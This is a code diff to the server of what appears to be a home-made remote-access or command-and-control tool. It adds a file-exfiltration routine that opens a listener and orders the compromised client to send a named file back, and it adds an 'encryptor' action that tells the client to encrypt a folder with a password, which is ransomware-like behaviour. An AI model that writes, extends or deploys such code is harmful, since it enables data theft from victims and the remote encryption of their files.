@@ -11,13 +11,13 @@ import time
 
 import imports
 import linux_info
-import detection_prevention
 
 
 HEADER = 64
 FORMAT = 'utf-8'
 
 class s_sock:
+    
     
     def start_server(self, ip, port):
         
@@ -66,6 +66,7 @@ class s_sock:
     
     
     def send_msg(self, message):
+        
         self.start_server.conn.send(message.encode())
         recieve_msg = self.start_server.conn.recv(10000).decode()
         
@@ -78,18 +79,39 @@ class s_sock:
         #print(recieve_msg) 
         return recieve_msg
     
-    def file_download(self, file): ## << message is the same as file in this case
-        self.start_server.conn.send(file.encode())
-
-        with open("/home/kali/file","wb") as writefile:
-            while True:
+    
+    def file_download(self, message): ## << message is the same as file in this case
+        import filetransfer_server as fts
+        
+        lst = []
+        
+        for i in message.split():
+            lst.append(i)
             
-                recieve_msg = self.start_server.conn.recv(10) ##no decode becasue we need the bytes
-
-                if not recieve_msg:## on no more tranfered data, break
-                    break
-
-                writefile.write(recieve_msg)
+        print(lst)
+        
+        LISTEN_IP = lst[0]
+        LISTEN_PORT = lst[1]
+        SAVE_FILEPATH = lst[2]
+        FILE_TO_GET = lst[3]
+            
+        
+        #LISTEN_IP = "0.0.0.0"
+        #LISTEN_PORT = 5000
+        #SAVE_FILEPATH = file
+        
+        ## sending details TO THE LISTEN SERVER
+        ## needs to be in a thread to not block the lower from running
+        
+        server_recieve = threading.Thread(target=fts.s_recieve_file, args=(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH))
+        server_recieve.start()
+        
+        #fts.s_recieve_file(LISTEN_IP, LISTEN_PORT, SAVE_FILEPATH)
+        
+        ## Sending TO THE CLIENT
+        message = f"!_get {LISTEN_IP} {LISTEN_PORT} {FILE_TO_GET}" 
+        self.start_server.conn.send(message.encode()) ## sending to client to send the file
+        return True
 
 
 
@@ -104,6 +126,9 @@ class s_action:
     
     def c_os():
         return s_sock.send_msg(s_sock, linux_info.target.os())
+    
+    def encryptor(folder, extension, password):
+        s_sock.send_msg(s_sock, f"!_encrypt {folder} {extension} {password}")
 
 
 if __name__ == "__main__":
